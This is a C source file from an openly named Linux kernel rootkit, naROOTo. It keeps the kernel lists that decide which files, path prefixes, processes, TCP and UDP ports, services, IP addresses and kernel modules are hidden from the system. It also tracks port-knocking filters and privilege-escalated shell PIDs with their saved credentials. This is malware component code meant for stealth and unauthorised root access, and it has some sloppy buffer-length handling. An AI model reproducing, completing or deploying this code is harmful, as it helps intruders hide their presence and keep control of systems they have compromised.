/******************************************************************************
 *
 * Name: control.c 
 * This file manages the data structures used for determining
 * which files, processes, modules, sockets, ... need to be hidden.
 *
 *****************************************************************************/
/*
 * This file is part of naROOTo.

 * naROOTo is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * naROOTo is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with naROOTo.  If not, see <http://www.gnu.org/licenses/>. 
 */

#include <linux/list.h>
#include <linux/pid.h>
#include <linux/sched.h>
#include <linux/slab.h>

#include "control.h"
#include "include.h"

static int ctrl_loaded = 0;

static struct list_head paths;
static struct list_head prefixes;
static struct list_head processes;
static struct list_head tcp_sockets;
static struct list_head udp_sockets;
static struct list_head knocking_tcp_ports;
static struct list_head knocking_udp_ports;
static struct list_head hidden_services;
static struct list_head hidden_ips;
static struct list_head modules;
static struct list_head port_knocking_enabled;
static struct list_head escalated_pids;

int
control_loaded (void)
{
	return ctrl_loaded;
}

int
is_path_hidden (char *name)
{
	struct file_name *cur;
	struct list_head *cursor;
	
	if(name == NULL) {
		return 0;
	}
		
	list_for_each(cursor, &paths) {
		cur = list_entry(cursor, struct file_name, list);
		if(strcmp(cur->name, name) == 0) {
			return 1;
		}
	}

	return 0;
}

int
hide_file_path (char *name)
{
	struct file_name *new;

	if(!control_loaded())
		return -EPERM;

	if(strlen(name) > 1023 || is_path_hidden(name))
		return -EINVAL;

	new = kmalloc(sizeof(struct file_name), GFP_KERNEL);
	if(new == NULL)
		return -ENOMEM;
	
	strncpy(new->name, name, 1023);

	list_add(&new->list, &paths);
	
	return 0;
}

int
unhide_file_path (char *name)
{
	struct file_name *cur;
	struct list_head *cursor, *next;

	if(!control_loaded())
		return -EPERM;

	list_for_each_safe(cursor, next, &paths) {
		cur = list_entry(cursor, struct file_name, list);
		if(strcmp(cur->name, name) == 0) {
			list_del(cursor);
			kfree(cur);
			return 0;
		}
	}
	
	return -EINVAL;
}

struct list_head *
get_prefix_list (void)
{
	return &prefixes;
}

int
is_prefix_hidden (char *name)
{
	struct file_prefix *cur;
	struct list_head *cursor;
	
	if(name == NULL)
		return 0;
		
	list_for_each(cursor, &prefixes) {
		cur = list_entry(cursor, struct file_prefix, list);
		if(strcmp(cur->name, name) == 0)
			return 1;
	}

	return 0;
}

int
hide_file_prefix (char *name)
{
	struct file_prefix *new;

	if(!control_loaded())
		return -EPERM;

	if(strlen(name) > 63 || is_prefix_hidden(name))
		return -EINVAL;

	new = kmalloc(sizeof(struct file_prefix), GFP_KERNEL);
	if(new == NULL) {
		return -ENOMEM;
	}
	
	strncpy(new->name, name, 63);

	list_add(&new->list, &prefixes);

	return 0;
}

int
unhide_file_prefix (char *name)
{
	struct file_prefix *cur;
	struct list_head *cursor, *next;

	if(!control_loaded())
		return -EPERM;

	list_for_each_safe(cursor, next, &prefixes) {
		cur = list_entry(cursor, struct file_prefix, list);
		if(strcmp(cur->name, name) == 0) {
			list_del(cursor);
			kfree(cur);
			return 0;
		}
	}

	return -EINVAL;
}

int
is_process_hidden (pid_t pid)
{
	struct process *cur;
	struct list_head *cursor;
	struct task_struct *task;

	task = pid_task(find_vpid(pid), PIDTYPE_PID);

	/* sanity check */
	if(task == NULL)
		return -EINVAL;

	do {
		list_for_each(cursor, &processes) {
			cur = list_entry(cursor, struct process, list);
			if(cur->pid == task->pid)
				return 1;
		}
		
		task = task->parent;
	} while (task != NULL && task->pid != 0);

	return 0;
}

int
hide_process (pid_t pid)
{
	struct process *new;
	
	if(!control_loaded())
		return -EPERM;

	if(is_process_hidden(pid) || pid < 0)
		return -EINVAL;

	new = kmalloc(sizeof(struct process), GFP_KERNEL);
	if(new == NULL)
		return -ENOMEM;
	
	new->pid = pid;

	list_add(&new->list, &processes);
	
	return 0;
}

int
unhide_process (pid_t pid)
{
	struct process *cur;
	struct list_head *cursor, *next;

	if(!control_loaded())
		return -EPERM;

	list_for_each_safe(cursor, next, &processes) {
		cur = list_entry(cursor, struct process, list);
		if(cur->pid == pid) {
			list_del(cursor);
			kfree(cur);
			return 0;
		}
	}

	return -EINVAL;
}

int
is_tcp_socket_hidden (int port)
{
	struct tcp_socket *cur;
	struct list_head *cursor;
	
	list_for_each(cursor, &tcp_sockets) {
		cur = list_entry(cursor, struct tcp_socket, list);
		if(cur->port == port)
			return 1;
	}

	return 0;
}

int
hide_tcp_socket (int port) 
{
	struct tcp_socket *new;
	
	if(!control_loaded())
		return -EPERM;

	if(is_tcp_socket_hidden(port) || port <= 0 || port > 65535)
		return -EINVAL;

	new = kmalloc(sizeof(struct tcp_socket), GFP_KERNEL);
	if(new == NULL)
		return -ENOMEM;
	
	new->port = port;

	list_add(&new->list, &tcp_sockets);
	
	return 0;
}

int
unhide_tcp_socket (int port)
{
	struct tcp_socket *cur;
	struct list_head *cursor, *next;

	if(!control_loaded())
		return -EPERM;

	list_for_each_safe(cursor, next, &tcp_sockets) {
		cur = list_entry(cursor, struct tcp_socket, list);
		if(cur->port == port) {
			list_del(cursor);
			kfree(cur);
			return 0;
		}
	}

	return -EINVAL;
}

int
is_udp_socket_hidden (int port)
{
	struct udp_socket *cur;
	struct list_head *cursor;
	
	list_for_each(cursor, &udp_sockets) {
		cur = list_entry(cursor, struct udp_socket, list);
		if(cur->port == port)
			return 1;
	}

	return 0;
}

int
hide_udp_socket (int port)
{
	struct udp_socket *new;
	
	if(!control_loaded())
		return -EPERM;

	if(is_udp_socket_hidden(port) || port <= 0 || port > 65535)
		return -EINVAL;

	new = kmalloc(sizeof(struct udp_socket), GFP_KERNEL);
	if(new == NULL)
		return -ENOMEM;
	
	new->port = port;

	list_add(&new->list, &udp_sockets);
	
	return 0;
}

int
unhide_udp_socket (int port)
{
	struct udp_socket *cur;
	struct list_head *cursor, *next;

	if(!control_loaded())
		return -EPERM;

	list_for_each_safe(cursor, next, &udp_sockets) {
		cur = list_entry(cursor, struct udp_socket, list);
		if(cur->port == port) {
			list_del(cursor);
			kfree(cur);
			return 0;
		}
	}

	return -EINVAL;
}

int
is_knocked_tcp (int port)
{
	struct knocking_tcp_port *cur;
	struct list_head *cursor;
	
	list_for_each(cursor, &knocking_tcp_ports) {
		cur = list_entry(cursor, struct knocking_tcp_port, list);
		if(cur->port == port)
			return 1;
	}

	return 0;
}

int
enable_knocking_tcp (int port) 
{
	struct knocking_tcp_port *new;
	
	if(!control_loaded())
		return -EPERM;

	if(is_knocked_tcp(port) || port <= 0 || port > 65535)
		return -EINVAL;

	new = kmalloc(sizeof(struct knocking_tcp_port), GFP_KERNEL);
	if(new == NULL)
		return -ENOMEM;
	
	new->port = port;

	list_add(&new->list, &knocking_tcp_ports);
	
	return 0;
}

int
disable_knocking_tcp (int port)
{
	struct knocking_tcp_port *cur;
	struct list_head *cursor, *next;

	if(!control_loaded())
		return -EPERM;

	list_for_each_safe(cursor, next, &knocking_tcp_ports) {
		cur = list_entry(cursor, struct knocking_tcp_port, list);
		if(cur->port == port) {
			list_del(cursor);
			kfree(cur);
			return 0;
		}
	}

	return -EINVAL;
}

int
is_knocked_udp (int port)
{
	struct knocking_udp_port *cur;
	struct list_head *cursor;
	
	if(!control_loaded())
		return -EPERM;

	list_for_each(cursor, &knocking_udp_ports) {
		cur = list_entry(cursor, struct knocking_udp_port, list);
		if(cur->port == port)
			return 1;
	}

	return 0;
}

int
enable_knocking_udp (int port) 
{
	struct knocking_udp_port *new;
	
	if(!control_loaded())
		return -EPERM;

	if(is_knocked_udp(port) || port <= 0 || port > 65535)
		return -EINVAL;

	new = kmalloc(sizeof(struct knocking_udp_port), GFP_KERNEL);
	if(new == NULL)
		return -ENOMEM;
	
	new->port = port;

	list_add(&new->list, &knocking_udp_ports);
	
	return 0;
}

int
disable_knocking_udp (int port)
{
	struct knocking_udp_port *cur;
	struct list_head *cursor, *next;

	if(!control_loaded())
		return -EPERM;

	list_for_each_safe(cursor, next, &knocking_udp_ports) {
		cur = list_entry(cursor, struct knocking_udp_port, list);
		if(cur->port == port) {
			list_del(cursor);
			kfree(cur);
			return 0;
		}
	}

	return -EINVAL;
}

int
is_service_hidden (int port)
{
	struct hidden_service *cur;
	struct list_head *cursor;
	
	list_for_each(cursor, &hidden_services) {
		cur = list_entry(cursor, struct hidden_service, list);
		if(cur->port == port)
			return 1;
	}

	return 0;
}

int
hide_service (int port) 
{
	struct hidden_service *new;
	
	if(!control_loaded())
		return -EPERM;

	if(is_service_hidden(port) || port <= 0 || port > 65535)
		return -EINVAL;

	new = kmalloc(sizeof(struct hidden_service), GFP_KERNEL);
	if(new == NULL)
		return -ENOMEM;
	
	new->port = port;

	list_add(&new->list, &hidden_services);
	
	return 0;
}

int
unhide_service (int port)
{
	struct hidden_service *cur;
	struct list_head *cursor, *next;
	
	if(!control_loaded())
		return -EPERM;

	list_for_each_safe(cursor, next, &hidden_services) {
		cur = list_entry(cursor, struct hidden_service, list);
		if(cur->port == port) {
			list_del(cursor);
			kfree(cur);
			return 0;
		}
	}

	return -EINVAL;
}

int
is_ip_hidden (__u32 ipaddr)
{
	struct hidden_ip *cur;
	struct list_head *cursor;
	
	list_for_each(cursor, &hidden_ips) {
		cur = list_entry(cursor, struct hidden_ip, list);
		if(cur->ipaddr == ipaddr)
			return 1;
	}

	return 0;
}

int
hide_ip_address (__u32 ipaddr)
{
	struct hidden_ip *new;
	
	if(!control_loaded())
		return -EPERM;

	if(is_ip_hidden(ipaddr))
		return -EINVAL;

	new = kmalloc(sizeof(struct hidden_ip), GFP_KERNEL);
	if(new == NULL)
		return -ENOMEM;
	
	new->ipaddr = ipaddr;

	list_add(&new->list, &hidden_ips);
	
	return 0;
}

int
unhide_ip_address (__u32 ipaddr)
{
	struct hidden_ip *cur;
	struct list_head *cursor, *next;

	if(!control_loaded())
		return -EPERM;

	list_for_each_safe(cursor, next, &hidden_ips) {
		cur = list_entry(cursor, struct hidden_ip, list);
		if(cur->ipaddr == ipaddr) {
			list_del(cursor);
			kfree(cur);
			return 0;
		}
	}

	return -EINVAL;
}

int
is_module_hidden (char *name)
{
	struct modules *cur;
	struct list_head *cursor;
	
	if(name == NULL)
		return 0;
		
	list_for_each(cursor, &modules) {
		cur = list_entry(cursor, struct modules, list);
		if(strcmp(cur->name, name) == 0)
			return 1;
	}

	return 0;
}

int
hide_module (char *name)
{
	struct modules *new;

	if(!control_loaded())
		return -EPERM;

	if(strlen(name) > 63 || is_module_hidden(name))
		return -EINVAL;
	
	new = kmalloc(sizeof(struct modules), GFP_KERNEL);
	if(new == NULL)
		return -ENOMEM;
	
	strncpy(new->name, name, 1023);

	list_add(&new->list, &modules);
	
	return 0;
}

int
unhide_module (char *name)
{
	struct modules *cur;
	struct list_head *cursor, *next;

	if(!control_loaded())
		return -EPERM;

	list_for_each_safe(cursor, next, &modules) {
		cur = list_entry(cursor, struct modules, list);
		if(strcmp(cur->name, name) == 0) {
			list_del(cursor);
			kfree(cur);
			return 0;
		}
	}

	return -EINVAL;
}

int
is_port_filtered (int port, int protocol, int ipaddr)
{
	struct port_knocking *cur;
	struct list_head *cursor;

	list_for_each(cursor, &port_knocking_enabled) {
		cur = list_entry(cursor, struct port_knocking, list);
		
		/* if port and protocol match (but not ipaddr), filter it */
		if(cur->port == port
			&& cur->protocol == protocol
			&& cur->ipaddr != ipaddr)
			return 1;
	}

	return 0;
}

int
filter_port (int port, int protocol, __u32 ipaddr)
{
	struct port_knocking *new;
	
	if(!control_loaded())
		return -EPERM;

	if(ipaddr == 0x00000000)	/* illegal/reserved ipaddr */
		return -EINVAL;
	
	if(is_port_filtered(port, protocol, 0x00000000))
		return -EINVAL;

	new = kmalloc(sizeof(struct port_knocking), GFP_KERNEL);
	if(new == NULL)
		return -ENOMEM;
	
	new->port = port;
	new->protocol = protocol;
	new->ipaddr = ipaddr;

	list_add(&new->list, &port_knocking_enabled);
	
	return 0;
}

int
unfilter_port (int port, int protocol)
{
	struct port_knocking *cur;
	struct list_head *cursor, *next;

	if(!control_loaded())
		return -EPERM;

	list_for_each_safe(cursor, next, &port_knocking_enabled) {
		cur = list_entry(cursor, struct port_knocking, list);
		if(cur->port == port
			&& cur->protocol == protocol) {
			list_del(cursor);
			kfree(cur);
			return 0;
		}
	}

	return -EINVAL;
}

struct escalated_pid *
is_shell_escalated (pid_t pid)
{
	struct escalated_pid *cur;
	struct list_head *cursor;

	if(pid == 0)
		return NULL;

	list_for_each(cursor, &escalated_pids) {
		cur = list_entry(cursor, struct escalated_pid, list);
		if(cur->pid == pid)
			return cur;
	}

	return NULL;
}

int 
escalate (struct escalated_pid *id)
{
	struct escalated_pid *new;
	
	if(!control_loaded())
		return -EPERM;

	if(!is_shell_escalated(id->pid)) {
		new = kmalloc(sizeof(struct escalated_pid), GFP_KERNEL);
		
		if(new == NULL)
			return -ENOMEM;
		
		new->pid = id->pid;
		
		new->uid   = id->uid;
		new->euid  = id->euid;
		new->suid  = id->suid;
		new->fsuid = id->fsuid;
		new->gid   = id->gid;
		new->egid  = id->egid;
		new->sgid  = id->sgid;
		new->fsgid = id->fsgid;
		
		list_add(&new->list, &escalated_pids);
	} else
		return -EINVAL;

	return 0;
}

int 
deescalate (pid_t pid)
{
	struct escalated_pid *cur;
	struct list_head *cursor, *next;
	
	if(!control_loaded())
		return -EPERM;

	list_for_each_safe(cursor, next, &escalated_pids) {
		cur = list_entry(cursor, struct escalated_pid, list);
		if(cur->pid == pid) {
			list_del(cursor);
			kfree(cur);
			return 0;
		}
	}

	return -EINVAL;
}

void
initialize_control (void)
{
	ROOTKIT_DEBUG("Initializing control datastructures...\n");

	INIT_LIST_HEAD(&paths);
	INIT_LIST_HEAD(&prefixes);
	INIT_LIST_HEAD(&processes);
	INIT_LIST_HEAD(&tcp_sockets);
	INIT_LIST_HEAD(&udp_sockets);
	INIT_LIST_HEAD(&knocking_tcp_ports);
	INIT_LIST_HEAD(&knocking_udp_ports);
	INIT_LIST_HEAD(&hidden_services);
	INIT_LIST_HEAD(&hidden_ips);
	INIT_LIST_HEAD(&modules);
	INIT_LIST_HEAD(&port_knocking_enabled);
	INIT_LIST_HEAD(&escalated_pids);

	ctrl_loaded = 1;
	
	ROOTKIT_DEBUG("Done.\n");
}

void
cleanup_control(void)
{
	ROOTKIT_DEBUG("Cleaning up control datastructures...\n");

	struct list_head *cursor, *next;
	struct file_name *name;
	struct file_prefix *prefix;
	struct process *process;
	struct tcp_socket *tcp;
	struct udp_socket *udp;
	struct knocking_tcp_port *tcp_knock;
	struct knocking_udp_port *udp_knock;
	struct hidden_service *service;
	struct hidden_ip *ip;
	struct modules *module;
	struct port_knocking *knocked_port;
	struct escalated_pid *esc_pid;
	
	ctrl_loaded = 0;
	
	cursor = next = NULL;
	list_for_each_safe(cursor, next, &paths) {
		name = list_entry(cursor, struct file_name, list);
		list_del(cursor);
		kfree(name);
	}
	
	cursor = next = NULL;
	list_for_each_safe(cursor, next, &prefixes) {
		prefix = list_entry(cursor, struct file_prefix, list);
		list_del(cursor);
		kfree(prefix);
	}
	
	cursor = next = NULL;
	list_for_each_safe(cursor, next, &processes) {
		process = list_entry(cursor, struct process, list);
		list_del(cursor);
		kfree(process);
	}
	
	cursor = next = NULL;
	list_for_each_safe(cursor, next, &tcp_sockets) {
		tcp = list_entry(cursor, struct tcp_socket, list);
		list_del(cursor);
		kfree(tcp);
	}
	
	cursor = next = NULL;
	list_for_each_safe(cursor, next, &udp_sockets) {
		udp = list_entry(cursor, struct udp_socket, list);
		list_del(cursor);
		kfree(udp);
	}
	
	cursor = next = NULL;
	list_for_each_safe(cursor, next, &knocking_tcp_ports) {
		tcp_knock = list_entry(cursor, struct knocking_tcp_port, list);
		list_del(cursor);
		kfree(tcp_knock);
	}
	
	cursor = next = NULL;
	list_for_each_safe(cursor, next, &knocking_udp_ports) {
		udp_knock = list_entry(cursor, struct knocking_udp_port, list);
		list_del(cursor);
		kfree(udp_knock);
	}
	
	cursor = next = NULL;
	list_for_each_safe(cursor, next, &hidden_services) {
		service = list_entry(cursor, struct hidden_service, list);
		list_del(cursor);
		kfree(service);
	}
	
	cursor = next = NULL;
	list_for_each_safe(cursor, next, &hidden_ips) {
		ip = list_entry(cursor, struct hidden_ip, list);
		list_del(cursor);
		kfree(ip);
	}
	
	cursor = next = NULL;
	list_for_each_safe(cursor, next, &modules) {
		module = list_entry(cursor, struct modules, list);
		list_del(cursor);
		kfree(module);
	}
	
	cursor = next = NULL;
	list_for_each_safe(cursor, next, &port_knocking_enabled) {
		knocked_port = list_entry(cursor, struct port_knocking, list);
		list_del(cursor);
		kfree(knocked_port);
	}
	
	cursor = next = NULL;
	list_for_each_safe(cursor, next, &escalated_pids) {
		esc_pid = list_entry(cursor, struct escalated_pid, list);
		list_del(cursor);
		kfree(esc_pid);
	}

	ROOTKIT_DEBUG("Done.\n");
}
